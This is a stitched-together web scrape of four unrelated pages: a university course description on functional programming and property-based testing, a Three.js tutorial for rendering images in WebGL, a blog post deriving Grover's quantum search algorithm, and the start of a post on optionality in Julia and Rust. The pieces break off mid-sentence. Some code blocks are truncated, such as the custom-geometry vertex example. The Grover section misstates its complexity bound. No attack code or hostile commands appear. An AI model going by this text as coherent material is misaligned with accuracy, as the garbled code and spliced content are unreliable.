<p>Previous versions of the course were given in the <a href="https://fagbesk.sam.sdu.dk/?fag_id=40112">spring of 2018 and 2019 at SDU</a> and in January 2016 and 2017 as <a href="http://www.kurser.dtu.dk/02913.aspx?menulanguage=en-GB">02913: Advanced Analysis Techniques</a> at <a href="http://www.compute.dtu.dk/english">DTU Compute</a>, <a href="http://www.dtu.dk/english">the Technical University of Denmark (DTU)</a>.</p>
<p>This course material is posted here for the purpose of information sharing. I don't believe in password-protected course administration systems. As a scholar I (continue to) benefit from freely available online material. This is a personal contribution to uphold such an eco-system.</p>
<h2 id="course-content">Course content</h2>
<p>The course is two-fold.</p>
<p>On the one hand it introduces functional programming: Immutable data, algebraic datatypes, pattern matching, recursion, functions as first-class values, proper tail calls, type-directed programming and functional programming patterns.</p>
<p>On the other hand it introduces 'Property-based testing' (QuickCheck) (next generation automated testing) expressed within the functional programming context: Generators, properties, shrinking, statistics of generators, type-directed testing, testing of imperative code while touching upon a number of more general testing concepts as debugging, unit-testing, corner cases, blackbox and whitebox testing and fuzzing.</p>
<p>Finally the course covers a number of real-world case studies of property-based testing, e.g., an automated test of the AUTOSAR specification for Volvo.</p>
<h2 id="practicalities">Practicalities</h2>
<p>The course consists of a mix of lectures and practical exercises, held in weekly 4-hour sessions.</p>
<p>Lectures: Mondays 12:15-16:00 in <a href="https://clients.mapsindoors.com/sdu/573f26e4bc1f571b08094312/details/563cb924423b7d0540c9a4a6">room U82</a></p>

Some of those experiments have involved <a href="https://douglasduhaime.com/posts/identifying-similar-images-with-tensorflow.html">identifying similar images</a> and visualizing patterns uncovered in this process. In this post, I wanted to discuss how we used the amazing Three.js library to build a WebGL-powered <a href="https://s3-us-west-2.amazonaws.com/lab-apps/pix-plot/index.html">visualization</a> that can display tens of thousands of images in an interactive 3D environment [click to enter]:</p>

  <img src="https://douglasduhaime.com/assets/posts/tsne-webgl/images/tsne-webgl-preview.jpg" alt="A preview of the WebGL-powered TSNE maps we will build below">
</a></p>

<p>If you’re interested in creating something similar, feel free to check out the <a href="https://github.com/YaleDHLab/pix-plot">full code</a>.</p>

<h2 id="getting-started-with-threejs">Getting Started with Three.js</h2>

<p>Three.js is a JavaScript library that generates lower-level code for WebGL, the standard API for 3D rendering in a web browser. Using Three.js, one can build complex 3D environments that would take much more code to build in raw WebGL. For a quick sample of the projects others have built with the library, check out the <a href="https://threejs.org/">Three.js homepage</a>.</p>

<p>To get started with Three.js, one needs to provide a bit of boilerplate code with the three essential elements of a Three.js page:</p>

<p><strong>scene</strong>: The scene contains all objects to be rendered:</p>

<figure><pre><code data-lang="javascript"><span>// Create the scene and a camera to view it</span>
<span>var</span> <span>scene</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Scene</span><span>();</span></code></pre></figure>

<p><strong>camera</strong>: The camera determines the position from which viewers see the scene:</p>

<figure><pre><code data-lang="javascript"><span>// Specify the portion of the scene visiable at any time (in degrees)</span>
<span>var</span> <span>fieldOfView</span> <span>=</span> <span>75</span><span>;</span>

<span>// Specify the camera's aspect ratio</span>
<span>var</span> <span>aspectRatio</span> <span>=</span> <span>window</span><span>.</span><span>innerWidth</span> <span>/</span> <span>window</span><span>.</span><span>innerHeight</span><span>;</span>

<span>// Specify the near and far clipping planes. Only objects</span>
<span>// between those planes will be rendered in the scene</span>
<span>// (these values help control the number of items rendered</span>
<span>// at any given time)</span>
<span>var</span> <span>nearPlane</span> <span>=</span> <span>0.1</span><span>;</span>
<span>var</span> <span>farPlane</span> <span>=</span> <span>1000</span><span>;</span>

<span>// Use the values specified above to create a camera</span>
<span>var</span> <span>camera</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>PerspectiveCamera</span><span>(</span>
  <span>fieldOfView</span><span>,</span> <span>aspectRatio</span><span>,</span> <span>nearPlane</span><span>,</span> <span>farPlane</span>
<span>);</span>

<span>// Finally, set the camera's position in the z-dimension</span>
<span>camera</span><span>.</span><span>position</span><span>.</span><span>z</span> <span>=</span> <span>5</span><span>;</span></code></pre></figure>

<p><strong>renderer</strong>: The renderer renders the scene to a canvas element on an HTML page:</p>

<figure><pre><code data-lang="javascript"><span>// Create the canvas with a renderer and tell the</span>
<span>// renderer to clean up jagged aliased lines</span>
<span>var</span> <span>renderer</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>WebGLRenderer</span><span>({</span><span>antialias</span><span>:</span> <span>true</span><span>});</span>

<span>// Specify the size of the canvas</span>
<span>renderer</span><span>.</span><span>setSize</span><span>(</span> <span>window</span><span>.</span><span>innerWidth</span><span>,</span> <span>window</span><span>.</span><span>innerHeight</span> <span>);</span>

<span>// Add the canvas to the DOM</span>
<span>document</span><span>.</span><span>body</span><span>.</span><span>appendChild</span><span>(</span> <span>renderer</span><span>.</span><span>domElement</span> <span>);</span></code></pre></figure>

<p>The code above creates the scene, adds a camera, and renders the canvas to the DOM. Now all we need to do is add some objects to the scene.</p>

<p>Each item rendered in a Three.js scene has a <strong>geometry</strong> and a <strong>material</strong>. Geometries use vertices (points) and faces (polygons described by vertices) to define the shape of an object, and materials use textures and colors to define the appearance of that shape. A geometry and a material can be combined into a <strong>mesh</strong>, which is a fully composed object ready to be added to a scene.</p>

<p>The example below uses the high-level <a href="https://threejs.org/docs/#api/geometries/BoxGeometry">BoxGeometry</a>, which comes with pre-built vertices and faces:</p>

<figure><pre><code data-lang="javascript"><span>// Create a cube with width, height, and depth set to 1</span>
<span>var</span> <span>geometry</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>BoxGeometry</span><span>(</span> <span>1</span><span>,</span> <span>1</span><span>,</span> <span>1</span> <span>);</span>

<span>// Use a simple material with a specified hex color</span>
<span>var</span> <span>material</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>MeshBasicMaterial</span><span>({</span> <span>color</span><span>:</span> <span>0xffff00</span> <span>});</span>

<span>// Combine the geometry and material into a mesh</span>
<span>var</span> <span>cube</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Mesh</span><span>(</span> <span>geometry</span><span>,</span> <span>material</span> <span>);</span>

<span>// Add the mesh to the scene</span>
<span>scene</span><span>.</span><span>add</span><span>(</span> <span>cube</span> <span>);</span></code></pre></figure>

<p>Finally, to render the scene on the page, one must call the <code>render()</code> method, passing in the scene and the camera as arguments:</p>

<figure><pre><code data-lang="javascript"><span>renderer</span><span>.</span><span>render</span><span>(</span> <span>scene</span><span>,</span> <span>camera</span> <span>);</span></code></pre></figure>

<p>Combining the snippets above gives the following result:</p>

<p data-height="265" data-theme-id="0" data-slug-hash="WXdYpx" data-default-tab="result" data-user="duhaime" data-embed-version="2" data-pen-title="The Simplest Three.js Scene">See the Pen <a href="https://codepen.io/duhaime/pen/WXdYpx/">The Simplest Three.js Scene</a> by Douglas Duhaime (<a href="https://codepen.io/duhaime">@duhaime</a>) on <a href="https://codepen.io/">CodePen</a>.</p>

<p>This is great, but the scene is static. To add some <strong>animation</strong> to the scene, one can periodically update the cube’s rotation property, then rerender the scene. To do so, one can replace the <code>renderer.render()</code> line above with a render loop that calls itself recursively. Here is a standard render loop in Three.js:</p>

<figure><pre><code data-lang="javascript"><span>function</span> <span>animate</span><span>()</span> <span>{</span>
  <span>requestAnimationFrame</span><span>(</span> <span>animate</span> <span>);</span>
  <span>renderer</span><span>.</span><span>render</span><span>(</span> <span>scene</span><span>,</span> <span>camera</span> <span>);</span>

  <span>// Rotate the object a bit each animation frame</span>
  <span>cube</span><span>.</span><span>rotation</span><span>.</span><span>y</span> <span>+=</span> <span>0.01</span><span>;</span>
  <span>cube</span><span>.</span><span>rotation</span><span>.</span><span>z</span> <span>+=</span> <span>0.01</span><span>;</span>
<span>}</span>
<span>animate</span><span>();</span></code></pre></figure>

<p>Adding this block at the bottom of the script makes the cube slowly rotate:</p>

<p data-height="265" data-theme-id="0" data-slug-hash="vWpvNL" data-default-tab="result" data-user="duhaime" data-embed-version="2" data-pen-title="Animating the Cube">See the Pen <a href="https://codepen.io/duhaime/pen/vWpvNL/">Animating the Cube</a> by Douglas Duhaime (<a href="https://codepen.io/duhaime">@duhaime</a>) on <a href="https://codepen.io/">CodePen</a>.</p>

<p>Adding <strong>lights</strong> to the scene can make it easier to differentiate the faces of the cube. To add lights to the scene above, we’ll first want to change the cube’s material, because as the documentation says the <a href="https://threejs.org/docs/#api/materials/MeshBasicMaterial">MeshBasicMaterial</a> is not affected by lights. Let’s replace the material defined above with a <a href="https://threejs.org/docs/#api/materials/MeshPhongMaterial">MeshPhongMaterial</a>:</p>

<figure><pre><code data-lang="javascript"><span>var</span> <span>material</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>MeshPhongMaterial</span><span>({</span><span>color</span><span>:</span> <span>0xffff00</span><span>})</span></code></pre></figure>

<p>Next let’s point a light at the cube so that different faces of the cube catch different amounts of light:</p>

<figure><pre><code data-lang="javascript"><span>// Add a point light with #fff color, .7 intensity, and 0 distance</span>
<span>var</span> <span>light</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>PointLight</span><span>(</span><span>0xffffff</span><span>,</span> <span>.</span><span>7</span><span>,</span> <span>0</span><span>);</span>

<span>// Specify the light's position in the x, y, and z dimensions</span>
<span>light</span><span>.</span><span>position</span><span>.</span><span>set</span><span>(</span><span>1</span><span>,</span> <span>1</span><span>,</span> <span>100</span><span>);</span>

<span>// Add the light to the scene</span>

<h2 id="adding-images-to-a-scene">Adding Images to a Scene</h2>

<p>The snippets above give a quick overview of the core elements of a Three.js scene. The following section will build upon those ideas to create a TSNE map of images.</p>

<p>To build an image viewer, we’ll need to load some image files into some Three.js materials. We can do so by using the <a href="https://threejs.org/docs/#api/loaders/TextureLoader">TextureLoader</a>:</p>

<figure><pre><code data-lang="javascript"><span>// Create a texture loader so we can load the image file</span>
<span>var</span> <span>loader</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>TextureLoader</span><span>();</span>

<span>// Specify the path to an image</span>
<span>var</span> <span>url</span> <span>=</span> <span>'https://s3.amazonaws.com/duhaime/blog/tsne-webgl/assets/cat.jpg'</span><span>;</span>

<span>// Load an image file into a MeshLambert material</span>
<span>var</span> <span>material</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>MeshLambertMaterial</span><span>({</span>
  <span>map</span><span>:</span> <span>loader</span><span>.</span><span>load</span><span>(</span><span>url</span><span>)</span>
<span>});</span></code></pre></figure>

<p>Now that the material is ready, the remaining steps are to generate a geometry from the image, combine the material and geoemtry into a mesh, and add the mesh to the scene, just like the cube example above. Because images are two-dimensional planes, we can use a simple <a href="https://threejs.org/docs/#api/geometries/PlaneGeometry">PlaneGeometry</a> for this object’s geometry:</p>

<figure><pre><code data-lang="javascript"><span>// create a plane geometry for the image with a width of 10</span>
<span>// and a height that preserves the image's aspect ratio</span>
<span>var</span> <span>geometry</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>PlaneGeometry</span><span>(</span><span>10</span><span>,</span> <span>10</span><span>*</span><span>.</span><span>75</span><span>);</span>

<span>// combine the image geometry and material into a mesh</span>
<span>var</span> <span>mesh</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Mesh</span><span>(</span><span>geometry</span><span>,</span> <span>material</span><span>);</span>

<span>// set the position of the image mesh in the x,y,z dimensions</span>
<span>mesh</span><span>.</span><span>position</span><span>.</span><span>set</span><span>(</span><span>0</span><span>,</span><span>0</span><span>,</span><span>0</span><span>)</span>

<span>// add the image to the scene</span>
<span>scene</span><span>.</span><span>add</span><span>(</span><span>mesh</span><span>);</span></code></pre></figure>

<p>The image will now appear in the scene:</p>

<p data-height="265" data-theme-id="0" data-slug-hash="jaYdLg" data-default-tab="result" data-user="duhaime" data-embed-version="2" data-pen-title="Adding an Image to a Three.js Scene">See the Pen <a href="https://codepen.io/duhaime/pen/jaYdLg/">Adding an Image to a Three.js Scene</a> by Douglas Duhaime (<a href="https://codepen.io/duhaime">@duhaime</a>) on <a href="https://codepen.io/">CodePen</a>.</p>

<p>It’s worth noting that one can swap out the PlanarGeometry for other geometries and Three.js will automatically wrap the material over the new geometry. The example below, for instance, swaps the PlanarGeometry for a more interesting Icosahedron geometry, and rotates the icosahedron inside the render loop:</p>

<figure><pre><code data-lang="javascript"><span>// use an icosahedron geometry instead of the planar geometry</span>
<span>var</span> <span>geometry</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>IcosahedronGeometry</span><span>();</span>

<span>// spin the icosahedron each animation frame</span>
<span>function</span> <span>animate</span><span>()</span> <span>{</span>
<span>requestAnimationFrame</span><span>(</span> <span>animate</span> <span>);</span>
  <span>renderer</span><span>.</span><span>render</span><span>(</span> <span>scene</span><span>,</span> <span>camera</span> <span>);</span>
  <span>mesh</span><span>.</span><span>rotation</span><span>.</span><span>x</span> <span>+=</span> <span>0.01</span><span>;</span>
  <span>mesh</span><span>.</span><span>rotation</span><span>.</span><span>y</span> <span>+=</span> <span>0.01</span><span>;</span>
  <span>mesh</span><span>.</span><span>rotation</span><span>.</span><span>z</span> <span>+=</span> <span>0.01</span><span>;</span>
<span>}</span>
<span>animate</span><span>();</span></code></pre></figure>

<p>This produces a strange looking cat indeed:</p>

<h2 id="building-custom-geometries">Building Custom Geometries</h2>

<p>The examples above use a few different geometries built into Three.js. Those geometries are based on the fundamental <a href="https://threejs.org/docs/#api/core/Geometry">THREE.Geometry</a> class, which is a primitive geometry one can use to create custom geometries. THREE.Geometry is lower-level than the prebuilt geometries used above, but it gives performance gains that make it worth the effort.</p>

<p>Let’s create a custom geometry by calling the THREE.Geometry constructor, which takes no arguments:</p>

<figure><pre><code data-lang="javascript"><span>var</span> <span>geometry</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Geometry</span><span>();</span></code></pre></figure>

<p>This geometry object doesn’t do much yet, because it doesn’t have any vertices with which to ariculate a shape. Let’s add four vertices to the geometry, one for each corner of the image. Each vertex takes three arguments, which define the vertex’s x, y, and z positions respectively:</p>

<figure><pre><code data-lang="javascript"><span>// identify the image width and height</span>
<span>var</span> <span>imageSize</span> <span>=</span> <span>{</span><span>width</span><span>:</span> <span>10</span><span>,</span> <span>height</span><span>:</span> <span>7.5</span><span>};</span>

<span>// identify the x, y, z coords where the image should be placed</span>
<span>// inside the scene</span>
<span>var</span> <span>coords</span> <span>=</span> <span>{</span><span>x</span><span>:</span> <span>-</span><span>5</span><span>,</span> <span>y</span><span>:</span> <span>-</span><span>3.75</span><span>,</span> <span>z</span><span>:</span> <span>0</span><span>};</span>

<span>// add one vertex for each image corner in this order:</span>
<span>// lower left, lower right, upper right, upper left</span>

    <span>coords</span><span>.</span><span>y</span><span>,</span>
    <span>coords</span><span>.</span><span>z</span>
  <span>),</span>
  <span>new</span> <span>THREE</span><span>.</span><span>Vector3</span><span>(</span>
    <span>coords</span><span>.</span><span>x</span><span>+</span><span>imageSize</span><span>.</span><span>width</span><span>,</span>

    <span>coords</span><span>.</span><span>z</span>
  <span>)</span>
<span>);</span></code></pre></figure>

<p>Now that the vertices are in place, we need to add some faces to the geometry. The code below will model an image as two triangle faces, as triangles are performant primitives in the WebGL world. The first triangle will combine the lower-left, lower-right, and upper-right vertices of the image, and the second will triangulate the lower-left, upper-right, and upper-left vertices of the image:</p>

<figure><pre><code data-lang="javascript"><span>// add the first face (the lower-right triangle)</span>
<span>var</span> <span>faceOne</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Face3</span><span>(</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>4</span><span>,</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>3</span><span>,</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>2</span>
<span>)</span>

<span>// add the second face (the upper-left triangle)</span>
<span>var</span> <span>faceTwo</span> <span>=</span> <span>new</span> <span>THREE</span><span>.</span><span>Face3</span><span>(</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>4</span><span>,</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>2</span><span>,</span>
  <span>geometry</span><span>.</span><span>vertices</span><span>.</span><span>length</span><span>-</span><span>1</span>
<span>)</span>

<span>// add those faces to the geometry</span>
<span>geometry</span><span>.</span><span>faces</span><span>.</span><span>push</span><span>(</span><span>faceOne</span><span>,</span> <span>faceTwo</span><span>);</span></code></pre></figure>

<p>Awesome, we now have a geometry with four vertices that describe the corners of the image, and two faces that describe the lower-right and upper-left-hand triangles of the image. The next step is to describe which portions of the cat image should appear in each of the faces of the geometry. To do so, one …</p></div></div>

      <h3 id="introduction">Introduction</h3>

<p>Grover’s algorithm is a quantum computing algorithm invented to search from <strong>unstructured</strong> database using less than $O(\sqrt{N})$ queries. Comparing to $O(N)$ which is the best asymptotical complexity that a classical search algorithm could achieve for unstructured database, Grover’s algorithm is significantly better.</p>



<p>In this blog post, I would like to discuss Grover’s algorithm and its caveats in details.</p>

<h3 id="prerequisites">Prerequisites</h3>

<p>From the <a href="https://leimao.github.io/blog/Simon-Algorithm/">property of Hadamard operator</a>, we have already known that</p><p>

\[\begin{align}
H^{\otimes {n}} | \mathbf{0} \rangle &amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>We denote it using $| \mathbf{s} \rangle$ for our convenience.</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>The following equation would be useful for this article.</p><p>

\[\begin{align}
2 | \mathbf{s} \rangle \langle \mathbf{s} | - I &amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \otimes_{\text{outer}} \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) - I \\
&amp;= 2 \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big) \Big( H^{\otimes {n}} | \mathbf{0} \rangle \Big)^{\dagger} - I \\
&amp;= 2 H^{\otimes {n}} | \mathbf{0} \rangle | \mathbf{0} \rangle^{\dagger}  H^{\otimes {n} \dagger} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - I \\
&amp;= 2 H^{\otimes {n}} \big(| \mathbf{0} \rangle \langle \mathbf{0} |\big)  H^{\otimes {n}} - H^{\otimes {n}} I H^{\otimes {n}} \\
&amp;= H^{\otimes {n}} \big(2 | \mathbf{0} \rangle \langle \mathbf{0} | - I \big) H^{\otimes {n}} \\
\end{align}\]

</p><p>where $| \mathbf{s} \rangle \langle \mathbf{s} |$ is the outer product of $| \mathbf{s} \rangle$ and $| \mathbf{s} \rangle$ and the $\otimes_{\text{outer}}$ is the outer product. Note that outer product $\otimes_{\text{outer}}$ is a little bit different from Kronecker product which we have used $\otimes$ to denote in the previous articles.</p>



<p>Let’s check what $| \mathbf{s} \rangle \langle \mathbf{s} |$ is.</p><p>

\[\begin{align}
| \mathbf{s} \rangle \langle \mathbf{s} | &amp;= \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \otimes_{\text{outer}} \bigg( \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \bigg) \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \otimes_{\text{outer}} | \mathbf{y} \rangle \\
&amp;= \frac{1}{2^n} \sum_{ \mathbf{x} \in \{0,1\}^n } \sum_{ \mathbf{y} \in \{0,1\}^n } | \mathbf{x} \rangle \langle \mathbf{y} | \\
&amp;= \frac{1}{2^n} 
\begin{bmatrix} 
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
    \vdots &amp; \vdots &amp; \vdots &amp; \vdots \\
    1 &amp; 1 &amp; \cdots &amp; 1 \\
\end{bmatrix}_{2^n \times 2^n} \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>where $J$ is the unit matrix.</p>



<p>We further define matrix $A$</p><p>

\[\begin{align}
A &amp;= | \mathbf{s} \rangle \langle \mathbf{s} | \\
&amp;= \frac{1}{2^n} J_{2^n \times 2^n} \\
\end{align}\]

</p><p>We would like to further show that matrix $2A - I$ is unitary.</p>



<p>It is trivial to see that $A^{\dagger} = A$, therefore, $(2A - I)^{\dagger} = 2A - I$. Because</p><p>

\[\begin{align}
(2A - I)^{\dagger} (2A - I) &amp;= (2A - I) (2A - I)^{\dagger} \\
&amp;= (2A - I)^2 \\
&amp;= 4A^2 - 4A + I \\
&amp;= \frac{4}{2^{2n}} 2^n J_{2^n \times 2^n} - \frac{4}{2^n} J_{2^n \times 2^n} + I \\
&amp;= 0 + I \\
&amp;= I \\
\end{align}\]

</p><p>This concludes the proof that $2A - I$ is unitary.</p>



<p>In addition, $2A - I$ is actually an reflection matrix that could reflect the vector $| \mathbf{x} \rangle$ about $| \mathbf{s} \rangle$.</p><p>

\[\begin{align}
| \mathbf{x}^{\prime} \rangle&amp;= (2A - I) | \mathbf{x} \rangle \\
&amp;= (2 | \mathbf{s} \rangle \langle \mathbf{s} | - I) | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s} | | \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle ( \langle \mathbf{s} | | \mathbf{x} \rangle ) - | \mathbf{x} \rangle \\
&amp;= 2 | \mathbf{s} \rangle \langle \mathbf{s}, \mathbf{x} \rangle - | \mathbf{x} \rangle \\
&amp;= 2 \langle \mathbf{s}, \mathbf{x} \rangle | \mathbf{s} \rangle - | \mathbf{x} \rangle \\
\end{align}\]

</p><p>Typically, given a normalized unit vector $\mathbf{n}$, and a vector $\mathbf{x}$, the reflected vector of vector $\mathbf{x}$ about $\mathbf{n}$ is</p><p>

\[\mathbf{x}^{\prime} = 2 \langle \mathbf{n}, \mathbf{x} \rangle \mathbf{n} - \mathbf{x}\]

</p><p>This is high-school math. If the reader forgot how to understand this, please refer to the blog post <a href="http://paulbourke.net/geometry/reflected/">“Calculating the Reflected Ray”</a>.</p>



<p>This concludes the proof that $2A - I$ is a reflection matrix about $| \mathbf{s} \rangle$.</p>

<h3 id="identity-search-problem">Identity Search Problem</h3>

<p>Suppose we have an array of items $\{v_0, v_1, \cdots, v_{n-1}\}$, and we would like to find a target item $v_g$ to find from the array. Using a classical algorithm, we have to go through the entire array, that is we retrieve items one by one from the array and compare them against the target item. The asymptotic complexity for the worst case and the average case are both $O(n)$.</p>



<p>It seems that $O(n)$ is the best we could do for a search problem using a classical algorithm. How could we know where is target item is in the array without going through the entire array? However, using a quantum algorithm, we would be able to complete a search in $O(\sqrt{n})$. In the next sections, we would see how we could achieve this.</p>



<p>Suppose all the items are distinct and there is only one item matching the query, the search problem could be modeled using a given function $f: \{0,1\}^n \rightarrow \{0,1\}$, and we are assured that there exits exactly one binary string $\mathbf{x}^\ast$, such that</p><p>

\[\begin{align}
f(\mathbf{x}) &amp;= 
    \begin{cases}
      1 &amp; \text{when $\mathbf{x} = \mathbf{x}^\ast$}\\
      0 &amp; \text{when $\mathbf{x} \neq \mathbf{x}^\ast$}\\
    \end{cases} 
\end{align}\]

</p><p>The search problem is converted to find $\mathbf{x}^\ast$.</p>

<h3 id="grovers-algorithm">Grover’s Algorithm</h3>

<h4 id="quantum-oracle-circuit">Quantum Oracle Circuit</h4>

<p>The following quantum oracle circuit is used for phase inversion in the Grover’s algorithm.</p>

<div>
<figure>
    <img src="https://leimao.github.io/images/blog/2020-08-22-Grover-Algorithm/oracle.png">
    <figcaption>Quantum Oracle Circuit</figcaption>
</figure>
</div>

<p>This quantum oracle circuit has been well discussed in my previous article on <a href="https://leimao.github.io/blog/Deutsch-Jozsa-Algorithm/">Deutsch-Jozsa algorithm</a>. We have known that</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= (-1)^{f(\mathbf{x})} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

</p><p>If the top input qubits to $U_f$ is an equal superposition, i.e.,</p><p>

\[\begin{align}
| \mathbf{s} \rangle &amp;= H^{\otimes {n}} | \mathbf{0} \rangle \\
&amp;= \frac{1}{\sqrt{2^n}} \sum_{ \mathbf{x} \in \{0,1\}^n } | \mathbf{x} \rangle \\
\end{align}\]

</p><p>what will the top output qubits be?</p>



<p>Because we have assumed that there is only one $\mathbf{x} = \mathbf{x}^\ast$, such that $f(\mathbf{x}) = 1$, and for $\mathbf{x} \neq \mathbf{x}^\ast$ we have $f(\mathbf{x}) = 0$,</p><p>

\[\begin{align}
|\varphi_2\rangle &amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} (-1)^{0} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) + \frac{1}{\sqrt{2^n}} (-1)^{1} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \frac{1}{\sqrt{2^n}} \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} |\mathbf{x}\rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \Bigg) - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
&amp;= \Bigg( \sum_{\mathbf{x} \neq \mathbf{x}^\ast}^{} \frac{1}{\sqrt{2^n}} |\mathbf{x}\rangle - \frac{1}{\sqrt{2^n}} |\mathbf{x}^\ast \rangle \Bigg) \otimes \frac{|0\rangle - |1\rangle}{\sqrt{2}} \\
\end{align}\]

</p><p>This means that for the top output qubits, although we have equal probability to observe each of the base qubit states, the phase amplitude of the base qubit $|\mathbf{x}^\ast \rangle$ is different from all the others! That is also to say, the phase of the top input qubits is 
$\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$, but the phase of the output qubits becomes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$.</p>

<h4 id="phase-diffusion-circuit">Phase Diffusion Circuit</h4>

<p>Now, in order to find $| \mathbf{x}^\ast \rangle$, the strategy becomes straightforward. We just have to find out the base qubits state whose phase amplitude is different from others. The question is, how to find it?</p>



<p>Let’s do some dummy trials. If we send the top output qubits to another identical quantum oracle circuit, the phase will go back to $\big[ \frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}} \big]$. The readers could verify this on you own. This means we have gone back to the origin. We should probably do something differently.</p>



<p>What Grover found was actually very smart. The average of the phase amplitudes $\big[ \frac{1}{\sqrt{2^n}}, \cdots, \frac{1}{\sqrt{2^n}}, -\frac{1}{\sqrt{2^n}}, \frac{1}{\sqrt{2^n}},\cdots, \frac{1}{\sqrt{2^n}} \big]$ is a value only a little bit smaller than $\frac{1}{\sqrt{2^n}}$, because the majority of the phase amplitudes are $\frac{1}{\sqrt{2^n}}$, and only one phase amplitude corresponding to $|\mathbf{x}^\ast \rangle$, which we denote as $\alpha_{\mathbf{x}^{\ast}}$, is $-\frac{1}{\sqrt{2^n}}$. If we could <em>inverse the phase amplitude about the mean</em>, the absolute value of $\alpha_{\mathbf{x}^{\ast}}$ will become the largest among all the phase amplitudes.</p>



<p>Specifically, at time step $t$, suppose the phase amplitude for each base qubits state $|\mathbf{x} \rangle$ is $\alpha_{\mathbf{x}, t}$. The average of the phase amplitudes $\mu_t$ is</p><p>

\[\mu_t = \frac{1}{2^n} \sum_{\mathbf{x} \in \{0,1\}^n}^{} \alpha_{\mathbf{x}, t}\]

</p><p>After the <em>inversion about the mean</em>, the phase amplitudes would become</p><p>

\[\begin{align}
\alpha_{\mathbf{x}, t}^{\prime} &amp;= (\mu_t - \alpha_{\mathbf{x}, t}) + \mu_t \\
&amp;= 2\mu_t - \alpha_{\mathbf{x}, t} \\
\end{align}\]

            <p>As I have mentioned in other posts on this blog (and surely many would agree here), I strongly believe that a great start for designing a program is figuring out good representations for the real world problem one tries to solve, <em>i.e.</em> defining appropriate types.
One helpful technique for that is what one could call <a href="https://www.reddit.com/r/Julia/comments/ijln21/blog_sum_types_in_julia_and_rust/g3f1gtn/"><em>optionality</em></a> .<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>
Interestingly, it is expressed completely differently in different programming languages which I would like to briefly demonstrate in this article using Rust and Julia as examples.</p>
<blockquote>
<p><strong>Remark:</strong>
Julia and Rust are my favourite programming languages and they are particularly suited to demonstrate my point.
That should not stop you from reading if you use neither of these languages, though!
First, both have a rather intuitive syntax and the code shown here is really basic, so you should be able to follow along.
Second, you can probably substitute your inheritance-using language for Julia (<em>e.g.</em> Java) or your tagged-union-using language for Rust (<em>e.g.</em> Haskell).
Even if not, you might learn something anyway!</p>
</blockquote>
<h2 id="scenario">Scenario</h2>
